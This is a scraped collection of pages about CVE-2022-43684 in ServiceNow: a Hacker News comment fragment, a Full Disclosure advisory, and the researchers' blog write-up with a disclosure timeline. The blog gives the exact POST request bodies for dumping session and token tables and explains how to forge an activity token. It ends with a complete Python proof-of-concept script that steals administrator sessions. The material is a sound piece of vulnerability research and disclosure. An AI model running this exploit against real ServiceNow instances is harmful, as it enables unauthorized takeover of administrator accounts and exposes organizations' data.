[prev](#36640902) | [next](#36640216) [–]  My vote goes to snow it’s much better than servicecenter and remedy. I’m a user only not admin or dev. | | --- | --- | --- | | | |  |  | [Sylamore](user?id=Sylamore) [on July 8, 2023](item?id=36641282)   | [parent](#36640205) | [next](#36640777) [–]  Eh, Remedy has lots of issues but I'd take it over "SNow" any day - at least it's easy to build CLI tools or API calls into Remedy. I'm neither an admin or user of either, just an end user. | | --- | --- | --- | | | |  |  | [doctaj](user?id=doctaj) [on July 8, 2023](item?id=36640777)   | [parent](#36640205) | [prev](#36641282) | [next](#36640216) [–]  Omg. “Snow”. You’re one of “them”. | | --- | --- | --- | | | |  |  | [miguelazo](user?id=miguelazo) [on July 8, 2023](item?id=36640216)   | [prev](#36640205) [–]  Does anyone else get a security warning about a background download when visiting this page? | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from seclists.org_831e7061_20250115_095836.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](16)

![](/shared/images/nst-icons.svg#search)

# ServiceNow Account Takeover to Full Admin Compromise

---

*From*: Luke Symons <rezkon93 () gmail com>

*Date*: Wed, 28 Jun 2023 14:42:56 +1000

---

```
1. INFORMATION

--------------

[+] CVE                : CVE-2022-43684

[+] Title : Insecure Access Control To Full Admin Compromise

[+] Vendor             : ServiceNow

[+] Publication date   : June 2023

[+] Credits            : Luke Symons, Tony Wu, Eldar Marcussen, Gareth
Phillips, Jeff Thomas, Nadeem Salim, and Stephen Bradshaw.

2. AFFECTED VERSIONS

--------------------

* Quebec prior to Patch 10 Hot Fix 8b

* Rome prior to Patch 10 Hot Fix 1

* San Diego prior to Patch 7

* Tokyo prior to Tokyo Patch 1; and

* Utah prior to Utah General Availability

3. DETAILS

----------

ServiceNow is a cloud-based platform that provides service management
software as a service (SaaS). It is used by a millions of companies
worldwide, and specializes in IT Service Management (ITSM), IT Operations
Management (ITOM), and IT Business Management (ITBM). It allows users to
manage incidents, service requests, problems, and changes within the IT
infrastructure of a business. It also provides a self-service portal where
end users can request IT services and log issues. During a security audit
it was identified that a threat actor could exploit a access control issue
and a number of other vulnerabilities and chain them together in a
ServiceNow instance leading to an effective account takeover to obtain
administrative access on the platform as a low privileged user.

An XHR request to xmlhttp.do with the "ChartDataProcessor" processor in the
POST request allows the enumeration of the ServiceNow GQL database,
including read access to the `sys_user_session` and `sys_user_token`
tables, which provide the necessary information to generate valid
`glide_user_activity` and `glide_session_store` cookies, and the
X-Usertoken header to allow privilege escalation to any previously
authenticated user.

4. Information

----

A blog writeup detailing the vulnerablties and issues aswell as a proof of
concept can be accessed at
<https://x64.sh/posts/ServiceNow-Insecure-access-control-to-admin/>

5. Remediation

----

ServiceNow has released patches and an upgrade that address an Access
Control List (ACL) bypass issue in ServiceNow Core functionality.
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](16)

### Current thread:

* **ServiceNow Account Takeover to Full Admin Compromise** *Luke Symons (Jul 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_cdee5cf7_20250115_095835.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from support.servicenow.com_fd2f8b19_20250115_095838.html ===
  Loading...Skip to page contentSkip to chatSkip to page contentSkip to chat
##

##

##

##



=== Content from x64.sh_f6acd6ea_20250115_095840.html ===


[![avatar](https://pbs.twimg.com/profile_images/815194594874822657/jpOtip9U_400x400.jpg)](/)

[R3zk0n](/)

Bug hunter and exploiter in web security, \*OSX, and mobile applications.

* [HOME](/)
* [ADVISORIES](/advisories/)
* [CATEGORIES](/categories/)
* [TAGS](/tags/)
* [ARCHIVES](/archives/)

[Home](/)

ServiceNow Insecure Access Control To Full Admin Takeover

Post

Cancel

# ServiceNow Insecure Access Control To Full Admin Takeover

Posted

*Jun 26, 2023*

By
*[R3zk0n](https://twitter.com/Rezk0n)*

*13 min* read

## ServiceNow Insecure Access Control leading to Administrator Account Takeover - **CVE-2022-43684**

In this article, we will discuss a series of vulnerabilities that when exploited in succession, could enable a low-privilege user in ServiceNow to gain unauthorized full administrative access to the ServiceNow instance.

ServiceNow is a cloud-based platform that provides service management software as a service (SaaS). It is used by a millions of companies worldwide, and specializes in IT Service Management (ITSM), IT Operations Management (ITOM), and IT Business Management (ITBM). It allows users to manage incidents, service requests, problems, and changes within the IT infrastructure of a business. It also provides a self-service portal where end users can request IT services and log issues.

While working internally as a security engineer on the offensive security team, we routinely scrutinize the security of third-party platforms that integrate with our systems and processes. This is a crucial step to verify the security of these platforms and prevent potential breaches that could expose our sensitive data. During a recent engagement in mid-2022 our security team was able to exploit a number of vulnerabilities in ServiceNow leading to an effective account takeover to obtain administrative access on the platform as a low privileged user.

## Table of Contents

* Exploring the ServiceNow application
* Discovering the XHR request behind âInteractive Analysisâ
* Enumerating tables using Glide Query Language (GQL)
* Constructing a valid session to escalate privileges to Administrator
* Ending Statement
* Credits
* Disclosure Timeline

## Exploring the ServiceNow application

While exploring the ServiceNow application, we determined that the application uses `.do` pages. `.do` endpoints are often associated with Java servlets, which are used to process requests and return dynamic content. As these pages query server-side resources, it should be secured against unauthorized or unintended access to prevent users from gaining access to sensitive functionality.

ServiceNow also uses Xml Http Requests (XHR), which is a fundamental technology behind Asynchronous JavaScript and XML (AJAX). The use of these API calls are to allow the performance of various operations without needing a full refresh of the page, which can improve the usability and efficiency of the application. ServiceNow widely uses XHR requests to update records or interacting with certain server-side resources or âprocessorsâ.

The application also uses the Glide Query Language (GQL), which is an proprietary, object-oriented language that forms the basis for the ServiceNow API to perform CRUD operations on its database. In essence, GQL serves as an abstraction layer for SQL operations that allows developers to perform database operations without interacting with raw SQL.

As a low privilege user, we discovered that it was not possible to directly access many of the applicationâs functionalities. An example is shown below, where we attempted to view the `$interactive_analysis.do` page:

![image]()

However, while navigating through the application, there are some locations that inadventently redirect us to sensitive pages by appending query strings needed to create a valid request. Due to insufficient access control being implemented, we discovered that a standard user could access the `$interactive_analysis.do` endpoint if the query string was correctly formatted. We can send the following request to successfully access the `$interactive_analysis.do` page:

```
https://somehost.service-now.com/$interactive_analysis.do?sysparm_field=password&sysparm_table=sys_user&sysparm_from_list=true&sysparm_query=active%3Dtrue%5Ecaller_id%3Djavascript:gs.getUserID()&sysparm_list_view=&sysparm_tiny_url=f040a8971ba38150d88b624c274bcbb3

```

This is shown below:

![image]()

This is a very interesting functionality, because at first glance it provides the low privilege user with a graphical representation of all the users that are within the application, which could potentially signal that potentially sensitive information is being retrieved through some database.

## Discovering the XHR request behind âInteractive Analysis

Through further investigation, we determined that the `$interactive_analysis.do` page, as well as the corresponding `report_viewer.do` (by accessing the chart from a separate page), sends an XHR request to `xmlhttp.do` with the âChartDataProcessorâ processor in the POST request. The initial output is quite complex, however it is possible to decode/trim the request and simplify it to the following POST body:

`| ``` 1  ``` | ``` sysparm_request_params={"page_num":"0","series":[{"table":"sys_user","groupby":"name","filter":"","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor   ``` |
| --- | --- |`
## Enumerating tables using Glide Query Language (GQL)

We identified that ServiceNow sent an XHR request to `xmlhttp.do` with the âChartDataProcessorâ processor in a GQL format. As previously mentioned, Glide Query Language is a language that is specifically used for ServiceNow, and the processors were scripts that run server-side that can be called through the XHR request. It is similar to SQL in the format structure sent in the POST request.

We identifed that the following parameters are of interest:

* `table`: The specific database table used by the application.
* `groupby`: Retrieves the rows from the specified column. This only retrieves the first 10 values used for rendering the chart/graph, however we can modify the âpage\_numâ to enumerate all the values.
* `filter`: Filtering the results retrieved from the GQL query.

Leveraging this access control issue we enumerated a number of databases using Burp Suite Intruder and online documentation used by developers of ServiceNow third party plugins. This section of the test required a lot of trial and error to identify potentially useful tables, as there were hundreds of different tables containing varying degrees of sensitive data. We identified that the following tables were particularly interesting for a threat actor:

* `sys_db_object`: Retrieves the complete list of tables used by the application.
* `sys_user`: List of all users
* `sys_emails`: List of all emails

According to the documentation, to be able to view ServiceNow tables we need to have read access to at least the ServiceNow tables `sys_db_object`, `sys_dictionary`, and `sys_glide_object`, and in addition to that to the tables you want to view, including referenced tables. However we were not allowed to access certain fields such as the `user_password` column in the `sys_user` table, as this would be an easy method to obtain privilege escalation against the system. Through further enumeration however, we were able to find two additional interesting tables, which will prove to be extremely useful later on:

* `sys_user_session`: Retrieves the âglide\_session\_storeâ and âX-Usertokenâ used by any account.
* `sys_user_token`: Partially retrieves the âglide\_user\_activityâ value.

## Constructing a valid session to escalate privileges to Administrator

When testing the application and enumerating the database using the GQL language, we also noted that a valid authenticated session requires the following cookies/headers:

* First method: The `glide_user_activity` and `glide_session_store` cookies, and the `X-Usertoken` header to be correctly set, OR
* Second method: The `JSESSIONID` cookie and the `X-Usertoken` header to be correctly set.

As it was possible to leak the tables we assumed that `sys_user_session` and `sys_user_token` would be all we needed to steal other accounts. While this was true there proved to be more nuance that made it more difficult to exploit.

The second method initially stood out since the knowledge of a `JSESSIONID` cookie and the `X-Usertoken` header would lead to an effective account takeover of any logged in administator user. Ultimately, we were unable to obtain the `JSESSIONID` from any table, however it may be possible to leverage XSS/CSRF for a successful account takeover, but this was never attempted because we were able to retrieve a valid pathway to exploitation using the first method. The steps are outlined as follows:

Firstly, we can use the following query to retrieve the `glide_session_store`, which is used to store session information for users. Each record represents a unique session for each user, as well as other related information:

`| ``` 1  ``` | ``` sysparm_request_params={"page_num":"0","series":[{"table":"sys_user_session","groupby":"id","filter":"nameCONTAINS[Insert_Admin_Email_Here]^invalidatedISNULL","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor   ``` |
| --- | --- |`

Note that the results are filtered by the name of the target user, which we can enumerate using the `sys_user` table - this can also help us determine who the administrators of the instance are. The `^invalidatedISNULL` removes all the invalidated or expired tokens.

Secondly, we need to retrieve the `X-Usertoken` value from the `sys_user_session` table, which is the CSRF token that the application provides users to ensure that requests made are genuine and not malicious. We require this token to make subsequent requests to the server.

`| ``` 1  ``` | ``` sysparm_request_params={"page_num":"0","series":[{"table":"sys_user_session","groupby":"csrf_token","filter":"nameCONTAINS[Insert_Admin_Email_Here]^invalidatedISNULL","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor   ``` |
| --- | --- |`

The most difficult aspect was to determine a valid `glide_user_activity` token. A standard `glide_user_activity` token looks like this:

`| ``` 1  ``` | ``` U0N2M18xOmV4VFozT2Eyb2p0OVVWcXY5WktIeUl2L2h5MjFBMlY1d3RnRWkrUVpkZnM9Ok9NNzFIRDV1S0ZBMy90L1plMW5oQXk0OWliYVdBMXFlZUc5cmE3aGdPQ1E9  ``` |
| --- | --- |`

We can make the following request to retrieve the partial token from the database:

`| ``` 1  ``` | ``` sysparm_request_params={"page_num":"0","series":[{"table":"sys_user_token","groupby":"token","filter":"nameCONTAINS[Insert_Admin_Email_Here]","plot_type":"horizontal_bar"}]}&sysparm_processor=ChartDataProcessor   ``` |
| --- | --- |`

However the values that were retrieved from `sys_user_token` appeared as follows:

![image]()

Each `glide_user_activity` token could be base64 decoded however, revealing that the value from `sys_user_token` was the first half of the token:

![image]()

Through trial and error, we determined that the signature section of the token was not sufficiently validated when sent to the server, and it was possible to simply replace or remove the second half of the token to create a valid token.

With all three requirements satisfied, it was then possible to takeover any account including administrative accounts with an active session on the ServiceNow instance. ServiceNow also implements impersonation to allow admin to login into any user account for debugging purposes, we were able to use the admin account to impersonate a spefical user admin account and grant our account admin privileges on the ServiceNow instance.

## Ending Statement

Overall, we were able to leverage several vulnerabilities to escalate privileges from a standard user account to administrator of the ServiceNow instance. The following vulnerabilities allowed us to gain effective account takeover:

* Insecure access control in the âChartDataProcessorâ processor
* Overly permissive read access to sensitive tables in ServiceNow database
* Insufficient signature validation of the `glide_user_activity` token

While the root cause of the issue was due to a insecure access control, the other vulnerabilties discovered and chained together took a medium impact bug to a critical impact bug with a CVSS score of *`9.9 - https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&version=3.1`*

## Credits

The multiple vulnerabilities leading to full compromise of the ServiceNow instance were discovered by Luke Symons, Tony Wu, Eldar Marcussen, Gareth Phillips, Jeff Thomas, Nadeem Salim, and Stephen Bradshaw.

## Proof of Concept

`| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183  ``` | ``` import base64 import requests import argparse import requests import bs4 import json import urllib3 import argparse import xml.etree.ElementTree as ET  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}   def banner():     banner = '''                  ..ooo@@@XXX%%%xx..             .oo@@XXX%x%xxx..     ` .           .o@XX%%xx..               ` .         o@X%..                  ..ooooooo       .@X%x.                 ..o@@^^   ^^@@o     .ooo@@@@@@ooo..      ..o@@^          @X%     o@@^^^     ^^^@@@ooo.oo@@^             %    xzI    -*--      ^^^o^^        --*-     %    @@@o     ooooooo^@@^o^@X^@oooooo     .X%x   I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x   I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x    @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x     ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx           o@@^^^ooo I^^ I^o ooo   .  x           oo @^ IX      I   ^X  @^ oo           IX     U  .        V     IX            V     .           .     V       .-~*Â´Â¨Â¯Â¨`*Â·~-.,-(Account Now)-,.-~*Â´Â¨Â¯Â¨`*Â·~-.         Privilege Escalation by Rezk0n and WucciSec        greets to Wireghoul, GmP, punk_fairybread, & d4rkt1d3        '''     print(banner)   target = "https://<ServiceNow_Instance>:443/xmlhttp.do" cookies = {"BIGipServerpool_<instancename>": "", "JSESSIONID": "", "__CJ_g_startTime": "%%22", "glide_mfa_remembered_browser": "", "glide_session_store": "", "glide_user_activity": "", "glide_user_route": ""} headers = {"User-Agent": "", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close", "X-Usertoken": "", "Origin": "", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Referer": "", "Te": "trailers", "Content-Type": "application/x-www-form-urlencoded"}    def get_users(xrange):     session = requests.session()     post_data = '{"page_num":"%s","series":[{"table": "sys_user","groupby":"user_name",' \                     '"filter":"","plot_type":"horizontal_bar"}]}' % (xrange)     payload = {"sysparm_request_params": post_data, "sysparm_processor": "ChartDataProcessor"}     json_response = session.post(target, headers=headers, cookies=cookies, data=payload,                                      proxies=proxies, verify=False)     tree = ET.fromstring(json_response.text)     notags = ET.tostring(tree, encoding='utf8', method='text')     json_data = json.loads(notags)     a = json_data['CHART_DATA']     b = json.loads(a)['series']     for i in b:         arr = i['aggregate_query']         c = i['aggregate_query']         print(c)         if len(c) == 0:             exit(1)     def retrieve_tokens(table, groupby, name, admin_filter):     session = requests.session()     if not admin_filter:         post_data = '{"page_num":"0","series":[{"table": "%s","groupby":"%s",' \                     '"filter":"nameCONTAINS%s","plot_type":"horizontal_bar"}]}' % (table, groupby, name)     else:         post_data = '{"page_num":"0","series":[{"table": "%s","groupby":"%s",' \                '"filter":"nameCONTAINS%s^invalidatedISNULL","plot_type":"horizontal_bar"}]}' % (                    table, groupby, name)     payload = {         "sysparm_request_params": post_data, "sysparm_processor": "ChartDataProcessor"}     json_response = session.post(target, headers=headers, cookies=cookies, data=payload,                                  proxies=proxies, verify=False)     tree = ET.fromstring(json_response.text)     notags = ET.tostring(tree, encoding='utf8', method='text')     json_data = json.loads(notags)     a = json_data['CHART_DATA']     b = json.loads(a)['series']     for i in b:         arr = i['aggregate_query']         c = i['aggregate_query'][0]     if not admin_filter:         base64_bytes_arr = []         num = 0         for val in arr:             try:                 token = arr[num].strip('token=')                 token_format = "SCv3_1:{}=:{}".format(token, "AAAA")                 encoded_token = token_format.encode('ascii')                 base64_bytes = base64.b64encode(encoded_token)                 base64_bytes_arr.append(base64_bytes)             except Exception as err:                 #print(err)                 print("No Active Session, we cant steal anything!! :(")                 exit(1)             num = num + 1         return base64_bytes_arr     else:         try:             return arr         except Exception as e:             print("No Vaild Sessions")             exit(1);   def validation(sess, user, activity):     session = requests.session()     validation_endpoint = "https://<ServiceNowInstance>/api/now/ui/impersonate/role"     validation_cookies = {         "glide_user_activity": activity,         "glide_session_store": sess     }     validation_headers = {"X-Usertoken": user,                "Origin": "https://<serviceNowInstance>", "Content-Type": "application/json;charset=utf-8"     }     payload = {"role":""}     json_response = session.post(validation_endpoint, headers=validation_headers, cookies=validation_cookies, json=payload,                                  proxies=proxies, verify=False)     return json_response.status_code, json_response.json()   def main():     glide_session_stores_arr = []     usertoken_arr = []     glide_user_activity_arr = []     try:         glide_session_stores_arr = retrieve_tokens('sys_user_session', 'id', args.n, True)         usertoken_arr = retrieve_tokens('sys_user_session', 'csrf_token', args.n, True)         glide_user_activity_arr = retrieve_tokens('sys_user_token', 'token', args.n, False)     except Exception as e:         print("No valid session with that user..:(\n")         exit(1)      print("Testing access to the /api/now/ui/impersonate/role endpoint")     is_valid = False     for glide_session_stores in glide_session_stores_arr:         for usertoken in usertoken_arr:             for glide_user_activity in glide_user_activity_arr:                 if is_valid:                     break                 try:                     session_token = glide_session_stores.strip("id=")                     user_token = usertoken[11:]                     activity_token = glide_user_activity.decode('ascii')                      status_code, response = validation(session_token, user_token, activity_token)                     if status_code == 201:                         print("Success! Potential Administrator Credentials!")                         print("\tglide_session_stores: " + str(session_token))                         print("\tX-Usertoken: " + str(user_token))                         print("\tglide_user_activity: " + str(activity_token))                         print("\n")                         active_roles = response['result']['activeRoles']                         print("\tActive Roles: " + str(active_roles))                         is_valid = True                     else:                         print(".",)                 except Exception as e:                     print(e)   if __name__ == "__main__":     banner()     parser = argparse.ArgumentParser()     parser.add_argument('-n', type=str, required=False, help="Provide a user account to takeover.")     parser.add_argument('-d', '--dump', action='store_true')     args = parser.parse_args()     if args.dump:         for i in range(1, 10):             get_users(xrange=i)     if args.n:         main()  ``` |
| --- | --- |`
## Disclosure Timeline

| Action | Date |
| --- | --- |
| Reported vulnerabilities to ServiceNow and provided POC script and provides remediation advice | 24th June, 2022 |
| Security Team Replies to Email regarding vulnerabilities | 27th June, 2022 |
| Security Team follows up with ServiceNow | 17th August, 2022 |
| ServiceNow imports Security team to Hacker one | 23th August, 2022 |
| Security requests for remediation and disclosure | 15th September, 2022 |
| ServiceNow replies with assigned single CVE number (Multiple bugs discovered) | 25th October, 2022 |
| Security Team replies to vendor | 28th October, 2022 |
| Security Team requests for timeline | 4th November, 2022 |
| ServiceNow responses with waiting next family release | 5th November, 2022 |
| Hackerone Triager changes report to Triaged | 22th December, 2022 |
| ServiceNow responses with update | 4th January, 2023 |
| Service Team requests to disclosure | 23th March, 2023 |
| ServiceNow Responses regarding timeline on next patch release | 29th March, 2023 |
| ServiceNow provides update to align internally - timeline not provided. | 12th April, 2023 |
| Security Team requests for medidation by Hackerone as vendor is delaying. | 2nd June, 2023 |
| ServiceNow responses with disclosure this month | 5th June, 2023 |
| ServiceNow publishes an article on support.servicenow.com | 8th June, 2023 |
| ServiceNow updates MITRE database with the assigned CVE-2022-43684 | 16th June, 2023 |
| Public disclosure | 26th June, 2023 |

[Vuln Research](/categories/vuln-research/),
[Web](/categories/web/)

[Web](/tags/web/)
[Web-Research](/tags/web-research/)

This post is licensed under
[CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
by the author.

Share

Trending Tags
[Web](/tags/web/)
[hacking](/tags/hacking/)
[penetration testing](/tags/penetration-testing/)
[Hacking](/tags/hacking/)
[mobile](/tags/mobile/)
[Penetration Testing](/tags/penetration-testing/)
[Android](/tags/android/)
[Mobile](/tags/mobile/)
[Samsung](/tags/samsung/)
[Web-Research](/tags/web-research/)

Contents

### Further Reading

[*Mar 20, 2023*
### JetEngine < 3.1.3.1 - Author+ Remote Code Execution

The plugin includes uploaded files without adequately ensuring that they are not executable, leading to a remote code execution vulnerability.
Proof of Concept - JetEngine Author+ Include() RCE
...](/posts/JetEngine-RCE-Author/)

[*Jan 18, 2021*
### XSS Encoding Generator

Quite often @wireghoul bugs me to blog post about various topics and things I have learnt over the years of a penetration testing.
So here is the first post of 2021! It is quite short but hopefull...](/posts/XSS-Gen/)

[*Mar 20, 2021*
### The NTLM Exchange

The NTLM Exchange.
Recently Orange Tsai discovered a great chain of bugs leading to remote code execution from an unauthenticated user in Microsoft Exchange which was widely named as Proxylogon (...](/posts/NTLM-Exchange/)

[JetEngine < 3.1.3.1 - Author+ Remote Code Execution](/posts/JetEngine-RCE-Author/)
[Misconfigured Microsoft Content Provider](/posts/Insecure-Content-Provider-Microsoft-Launcher/)

Â© 2024
[R3zk0n](https://twitter.com/Rezk0n).
Some rights reserved.

Powered by
[Jekyll](https://jekyllrb.com)
with
[Chirpy](https://github.com/cotes2020/jekyll-theme-chirpy)
theme.

Trending Tags
[Web](/tags/web/)
[hacking](/tags/hacking/)
[penetration testing](/tags/penetration-testing/)
[Hacking](/tags/hacking/)
[mobile](/tags/mobile/)
[Penetration Testing](/tags/penetration-testing/)
[Android](/tags/android/)
[Mobile](/tags/mobile/)
[Samsung](/tags/samsung/)
[Web-Research](/tags/web-research/)

×

A new version of content is available.

Update


